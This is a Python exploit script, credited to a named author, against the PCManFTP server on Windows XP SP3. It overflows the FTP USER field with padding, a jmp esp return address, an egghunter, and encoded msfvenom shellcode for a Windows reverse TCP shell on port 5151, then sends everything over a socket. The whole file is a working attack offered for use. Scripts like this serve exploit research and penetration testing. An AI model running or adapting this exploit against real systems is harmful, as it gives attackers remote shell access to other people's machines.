# Author: w4fz5uck5 -> https://github.com/w4fz5uck5

import struct, socket
   
def exploit():
        
    egghunter = ("\x66\x81\xCA\xFF\x0F\x42\x52\x6A\x02\x58\xCD"
                "\x2E\x3C\x05\x5A\x74\xEF\xB8"
                "\x77\x30\x30\x74" # w00t
                "\x8B\xFA\xAF\x75\xEA\xAF\x75\xE7\xFF\xE7")

    #msfvenom -p windows/shell_reverse_tcp lhost=0.0.0.0 lport=5151 -f python -e x86/shikata_ga_nai EXITFUNC=thread -b "\x00\x0a\x0d\x20\x40"  
    buf =  "w00tw00t" # Shellcode with egghunter at the beginning
    buf += "\xd9\xe5\xbd\x83\x50\xb1\xa7\xd9\x74\x24\xf4\x5e\x2b"
    buf += "\xc9\xb1\x52\x31\x6e\x17\x03\x6e\x17\x83\x6d\xac\x53"
    buf += "\x52\x8d\xa5\x16\x9d\x6d\x36\x77\x17\x88\x07\xb7\x43"
    buf += "\xd9\x38\x07\x07\x8f\xb4\xec\x45\x3b\x4e\x80\x41\x4c"
    buf += "\xe7\x2f\xb4\x63\xf8\x1c\x84\xe2\x7a\x5f\xd9\xc4\x43"
    buf += "\x90\x2c\x05\x83\xcd\xdd\x57\x5c\x99\x70\x47\xe9\xd7"
    buf += "\x48\xec\xa1\xf6\xc8\x11\x71\xf8\xf9\x84\x09\xa3\xd9"
    buf += "\x27\xdd\xdf\x53\x3f\x02\xe5\x2a\xb4\xf0\x91\xac\x1c"
    buf += "\xc9\x5a\x02\x61\xe5\xa8\x5a\xa6\xc2\x52\x29\xde\x30"
    buf += "\xee\x2a\x25\x4a\x34\xbe\xbd\xec\xbf\x18\x19\x0c\x13"
    buf += "\xfe\xea\x02\xd8\x74\xb4\x06\xdf\x59\xcf\x33\x54\x5c"
    buf += "\x1f\xb2\x2e\x7b\xbb\x9e\xf5\xe2\x9a\x7a\x5b\x1a\xfc"
    buf += "\x24\x04\xbe\x77\xc8\x51\xb3\xda\x85\x96\xfe\xe4\x55"
    buf += "\xb1\x89\x97\x67\x1e\x22\x3f\xc4\xd7\xec\xb8\x2b\xc2"
    buf += "\x49\x56\xd2\xed\xa9\x7f\x11\xb9\xf9\x17\xb0\xc2\x91"
    buf += "\xe7\x3d\x17\x35\xb7\x91\xc8\xf6\x67\x52\xb9\x9e\x6d"
    buf += "\x5d\xe6\xbf\x8e\xb7\x8f\x2a\x75\x50\xcf\xaa\x75\xa1"
    buf += "\x47\xa9\x75\xb5\x88\x24\x93\xdf\xa6\x60\x0c\x48\x5e"
    buf += "\x29\xc6\xe9\x9f\xe7\xa3\x2a\x2b\x04\x54\xe4\xdc\x61"
    buf += "\x46\x91\x2c\x3c\x34\x34\x32\xea\x50\xda\xa1\x71\xa0"
    buf += "\x95\xd9\x2d\xf7\xf2\x2c\x24\x9d\xee\x17\x9e\x83\xf2"
    buf += "\xce\xd9\x07\x29\x33\xe7\x86\xbc\x0f\xc3\x98\x78\x8f"
    buf += "\x4f\xcc\xd4\xc6\x19\xba\x92\xb0\xeb\x14\x4d\x6e\xa2"
    buf += "\xf0\x08\x5c\x75\x86\x14\x89\x03\x66\xa4\x64\x52\x99"
    buf += "\x09\xe1\x52\xe2\x77\x91\x9d\x39\x3c\xb1\x7f\xeb\x49"
    buf += "\x5a\x26\x7e\xf0\x07\xd9\x55\x37\x3e\x5a\x5f\xc8\xc5"
    buf += "\x42\x2a\xcd\x82\xc4\xc7\xbf\x9b\xa0\xe7\x6c\x9b\xe0"

    payload = "\x90" * 200 + buf # padding  + shellcode -> stack
    payload += "A" * (2006 - len(buf) - 200) # junk - len(shellcode) - len(padding) -> stack 
    payload += struct.pack("I", 0x7E429353) # jmp esp 
    payload += "\x90" * 200 # padding 
    payload += egghunter # egghunter code to search for the string "w00tw00t", and execute that remain after it, which is our
                         # shellcode(buf) onto the stack

    print "-==========PCManFTP2.exe-egghunter-exploit-WIN-XP-SP3============-"

    try:
        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)    
        s.connect(("127.0.0.1", 21))
        print "[*] Sending Payload..."
        s.send("USER " + payload + "\r\n") # Sending final payload to the "USER" parameter
        print "[+] Payload sent!"
        s.close()

    except Exception as e:
        print e
                      
exploit()
